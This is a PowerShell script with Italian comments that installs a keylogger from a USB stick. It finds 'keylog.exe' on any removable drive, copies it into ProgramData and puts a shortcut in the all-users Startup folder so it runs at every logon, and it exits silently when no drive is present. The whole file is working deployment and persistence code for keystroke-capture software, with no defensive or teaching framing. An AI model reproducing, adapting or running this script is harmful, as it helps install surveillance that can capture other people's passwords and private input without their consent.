# Script di distribuzione - Versione USB
# Cerca keylog.exe su chiavetta USB e crea collegamento in Startup comune.

$destDir = "C:\ProgramData\KeyLog"
$destExe = Join-Path $destDir "keylog.exe"
$startupDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$shortcutPath = Join-Path $startupDir "KeyLog.lnk"

# Cerca la chiavetta USB con il file
$usbDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
foreach ($drive in $usbDrives) {
    $testPath = Join-Path $drive.DeviceID "KeyLogger\keylog.exe"  # ← MODIFICATO QUI
    if (Test-Path $testPath) {
        $source = $testPath
        break
    }
}

# Verifica che il file sia stato trovato
if (-not $source) {
    # Exit silenzioso se non trova la chiavetta
    exit
}

# Crea directory di destinazione se non esiste
if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
}

# Copia il file dalla USB al computer
Copy-Item -Path $source -Destination $destExe -Force

# Crea collegamento in Startup (solo se non esiste già)
if (-not (Test-Path $shortcutPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $destExe
    $shortcut.WorkingDirectory = $destDir
    $shortcut.WindowStyle = 1  # finestra normale, visibile
    $shortcut.Description = "KeyLog"
    $shortcut.Save()
}
